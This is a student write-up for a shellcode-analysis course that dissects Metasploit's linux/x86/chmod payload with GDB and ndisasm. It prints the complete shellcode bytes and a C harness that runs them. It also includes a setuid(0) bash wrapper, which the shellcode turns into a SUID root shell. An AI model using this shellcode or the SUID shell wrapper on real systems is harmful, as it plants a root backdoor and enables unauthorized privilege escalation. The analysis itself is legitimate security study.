# Assignment #5: Metasploit chmod

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

## Solution

In this assignment we will take up the `linux/x86/chmod` shellcode from Metasploit, as generated by msfpayload. 

For this shellcode to work, we must provide it an input file to perform the operation on. The following C program was used:

#### a5-bash.c
```c
#include <stdlib.h>
void main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
```

The program was then compiled, chown'ed to root, and chmod'ed to readonly for everybody:

```bash
gcc a5-bash.c -o a5-bash
chown root:root a5-bash
chmod 444 a5-bash
ls -la a5-bash
	-r--r--r-- 1 root root 5188 Jun 20 19:41 a5-bash
```

For the purposes of this assignment, the mode we will be chmod'ing to will be 4755, also known as the SUID executable. 

With both, the file and the mode parameters set, everything is ready to begin the analysis.


## Analysis

Let us begin by generating and running the shellcode.

```bash
msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 C > a5-msf_chmod.c
```

Msfpayload will only generate the opcodes. We must append the execution skeleton manually.

#### a5-msf_chmod.c

```c
#include<stdio.h>
#include<string.h>
/*
 * linux/x86/chmod - 32 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, FILE=a5-bash, MODE=4755
 */
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x08\x00\x00\x00\x61\x35\x2d\x62\x61"
"\x73\x68\x00\x5b\x68\xed\x09\x00\x00\x59\xcd\x80\x6a\x01\x58"
"\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Now we are ready to compile and execute the shellcode.

```bash
gcc a5-msf_chmod.c -o a5-msf_chmod -fno-stack-protector -z execstack
ls -la a5-bash
	-r--r--r-- 1 root root 5188 Jun 20 19:41 a5-bash
./a5-msf_chmod
ls -la a5-bash
	-rwsr-xr-x 1 root root 5188 May 22 17:57 a5-bash
```

Ok, looks like everything works as expected. Executing the shellcode effectively makes `a5-bash` an SUID executable.

Let us know attempt to emulate the shellcode with Libemu, hopefully getting a nice outline of the shellcode execution flow.

```
msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 R | sctest -Svvvs 100000000000
```

Unfourtunately, Libemu fails to produce any useful output, so we proceed to disassembling raw shellcode with Ndisasm 

```
msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 R | ndisasm -u -
```

The analysis was done with the use of GDB,

```bash
gdb a5-msf_chmod
```
```gdb
gdb$ b *&code
Breakpoint 1 at 0x8049760

gdb$ run

gdb$ pdisass 
Dump of assembler code for function code:
=> 0x08049760 <+0>:	cdq    
   0x08049761 <+1>:	push   0xf
   0x08049763 <+3>:	pop    eax
   0x08049764 <+4>:	push   edx
   0x08049765 <+5>:	call   0x8049772 <code+18>				; shifted code, disassemble this function
   0x0804976a <+10>:	popa   
   0x0804976b <+11>:	xor    eax,0x7361622d
   0x08049770 <+16>:	push   0xed685b00
   0x08049775 <+21>:	or     DWORD PTR [eax],eax
   0x08049777 <+23>:	add    BYTE PTR [ecx-0x33],bl
   0x0804977a <+26>:	sub    BYTE PTR [edx+0x1],0x58
   0x0804977e <+30>:	int    0x80
   0x08049780 <+32>:	add    BYTE PTR [eax],al
End of assembler dump.


gdb$ pdisass 0x8049772 <code+18>
Dump of assembler code from 0x8049772 to 0x8049792:
   0x08049772 <code+18>:	pop    ebx
   0x08049773 <code+19>:	push   0x9ed
   0x08049778 <code+24>:	pop    ecx
   0x08049779 <code+25>:	int    0x80
   0x0804977b <code+27>:	push   0x1
   0x0804977d <code+29>:	pop    eax
   0x0804977e <code+30>:	int    0x80
   0x08049780 <code+32>:	add    BYTE PTR [eax],al
```

the following C libraries

- `/usr/include/i386-linux-gnu/asm/unistd_32.h`
- `/usr/include/asm-generic/fcntl.h`

as well as the Intel Assembly Instruction Set manual

- `64-ia-32-architectures-software-developer-vol-2a-2b-instruction-set-a-z-manual.pdf`

The following is the Ndisasm output commented to analyze and clarify each instruction:

```nasm
00000000  99                cdq							; edx = 0
00000001  6A0F              push byte +0xf				; #define __NR_chmod 15
00000003  58                pop eax 					; eax = int chmod(const char *path, mode_t mode);
00000004  52                push edx 					; put NULL dword on the stack

														; from here on, GDB was used to understand the code

00000005  E808000000        call dword 0x12 			; put PAYLOAD address on the stack
 |
 +->00000012	0x08049772 <code+18>:	pop    ebx 					; ebx = EIP return address [PAYLOAD @ 0000000A] (path)
	00000013	0x08049773 <code+19>:	push   0x9ed 				; put 4755 (octal) on the stack
	00000018	0x08049778 <code+24>:	pop    ecx 					; ecx = 4755 (mode)
	00000019	0x08049779 <code+25>:	int    0x80 				; chmod 4755 a5-bash
	0000001B	0x0804977b <code+27>:	push   0x1 					; #define __NR_exit 1
	0000001D	0x0804977d <code+29>:	pop    eax 					; eax = void exit(int status);
	0000001E	0x0804977e <code+30>:	int    0x80 				; exit
				0x08049780 <code+32>:	add    BYTE PTR [eax],al 	; this does not get executed

   														; PAYLOAD = a5-bash
0000000A  61                popad
0000000B  352D626173        xor eax,0x7361622d
00000010  68005B68ED        push dword 0xed685b00
														; chmod 4755 a5-bash
00000015  0900              or [eax],eax
00000017  0059CD            add [ecx-0x33],bl
0000001A  806A0158          sub byte [edx+0x1],0x58
0000001E  CD80              int 0x80
```


## Discussion and Conclusions

Undestanding this shellcode had several seemingly tricky parts, but with the use of GDB it was possible to trace the execution flow and relate it back to Ndisasm output in a way that would allow for easy instruction interpretation.

The shellcode basically works by using the `chmod()` system call, passing to it the path of the file and the permissions mode to be used. The shellcode uses the `CALL` instruction to put the payload address on the stack (the filename `a5-bash`). Finally, it executes the `chmod()` call on `a5-bash` with `4755` as the permissions mode, thereby making the file an SUID executable.


## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-5/chmod/example.png "Example")

Note: while executing `a5-msf_chmod`, the reported shellcode length is 7. This is of course due to the presence of NULL bytes in the shellcode.
